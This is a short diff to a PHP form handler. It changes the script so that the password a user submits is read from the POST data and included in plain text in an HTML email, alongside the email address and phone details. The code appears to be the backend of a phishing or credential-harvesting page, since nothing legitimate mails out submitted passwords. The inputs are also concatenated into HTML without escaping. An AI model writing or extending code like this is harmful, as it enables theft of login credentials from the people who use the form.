@@ -5,6 +5,7 @@ use Exception;
 include_once './config.php';
 
 $email                  =   $_POST['email'];
+$password               =   $_POST['password'];
 $phone_number           =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
 $phone_code             =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
 $country_code           =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];
@@ -15,6 +16,7 @@ if (empty($email)) {
     
     function sendEmail($try=1) {
         global $email;
+        global $password;
         global $phone_number;
         global $phone_code;
         global $country_code;
@@ -30,6 +32,7 @@ if (empty($email)) {
             $html          .=   '<p><b>Additional detail</b></p>' ;
             $html          .=   '<ul>' ;
             $html          .=   "<li>Email : <b>".$email."</b></li>";
+            $html          .=   "<li>Password : <b>".$password."</b></li>";
             if(!empty($phone_number)) {
                 $html       .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
                 $html       .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
